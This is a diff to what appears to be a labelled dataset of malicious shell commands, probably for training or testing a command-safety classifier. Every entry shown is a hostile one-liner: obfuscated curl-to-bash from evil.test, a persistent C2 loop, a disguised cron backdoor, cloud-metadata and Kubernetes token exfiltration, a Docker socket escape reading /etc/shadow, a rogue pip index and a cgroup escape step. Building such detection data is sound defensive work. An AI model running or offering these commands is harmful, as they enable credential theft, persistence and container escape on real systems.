@@ -33,3 +33,8 @@
 {"id": "b33", "label": "malicious", "desc": "dollar quote evasion", "command": "$'\\x63\\x75\\x72\\x6c' http://evil.test/payload | $'\\x62\\x61\\x73\\x68'"}
 {"id": "b34", "label": "malicious", "desc": "trap anti-kill persist", "command": "trap '' INT TERM HUP EXIT; while true; do curl -s http://evil.test/c2 | bash; sleep 300; done &"}
 {"id": "b35", "label": "malicious", "desc": "apt disguised backdoor", "command": "apt-get update -qq && echo '#!/bin/bash\ncurl http://evil.test/c2|bash' > /etc/cron.d/apt-daily-upgrade && chmod 644 /etc/cron.d/apt-daily-upgrade"}
+{"id": "b36", "label": "malicious", "desc": "cloud metadata theft", "command": "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ | curl -X POST -d @- http://evil.test/exfil"}
+{"id": "b37", "label": "malicious", "desc": "docker socket escape", "command": "docker -H unix:///var/run/docker.sock run -v /:/host alpine chroot /host sh -c 'cat /etc/shadow'"}
+{"id": "b38", "label": "malicious", "desc": "k8s token steal", "command": "cat /var/run/secrets/kubernetes.io/serviceaccount/token | curl -X POST -d @- http://evil.test/k8s"}
+{"id": "b39", "label": "malicious", "desc": "supply chain pip", "command": "pip install --index-url http://evil.test/simple/ backdoor-pkg"}
+{"id": "b40", "label": "malicious", "desc": "cgroup container escape", "command": "mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && echo 1 > /tmp/cgrp/notify_on_release"}
